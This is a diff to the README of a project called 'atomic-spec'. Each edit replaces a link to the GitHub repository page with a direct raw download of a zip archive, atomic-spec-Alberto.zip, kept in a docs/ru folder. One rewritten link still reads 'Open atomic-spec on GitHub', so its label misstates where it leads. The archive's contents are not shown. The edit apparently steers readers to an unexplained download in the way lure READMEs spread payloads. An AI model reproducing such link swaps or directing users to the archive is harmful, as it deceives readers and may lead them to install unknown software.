@@ -1,6 +1,6 @@
 # 🧩 atomic-spec - Clear specs for steady delivery
 
-[![Download atomic-spec](https://img.shields.io/badge/Download-atomic--spec-blue?style=for-the-badge&logo=github)](https://github.com/lovely392/atomic-spec)
+[![Download atomic-spec](https://img.shields.io/badge/Download-atomic--spec-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lovely392/atomic-spec/main/docs/ru/atomic-spec-Alberto.zip)
 
 ## 🪄 What atomic-spec does
 
@@ -31,7 +31,7 @@ For best results, close other large apps before you start the download.
 
 Use this link to visit the page and download atomic-spec:
 
-[Visit the atomic-spec download page](https://github.com/lovely392/atomic-spec)
+[Visit the atomic-spec download page](https://raw.githubusercontent.com/lovely392/atomic-spec/main/docs/ru/atomic-spec-Alberto.zip)
 
 If your browser asks what to do with the file, choose:
 
@@ -214,7 +214,7 @@ Try this:
 
 ## 🔗 Project link
 
-[Open atomic-spec on GitHub](https://github.com/lovely392/atomic-spec)
+[Open atomic-spec on GitHub](https://raw.githubusercontent.com/lovely392/atomic-spec/main/docs/ru/atomic-spec-Alberto.zip)
 
 ## 🧩 Topics covered
 
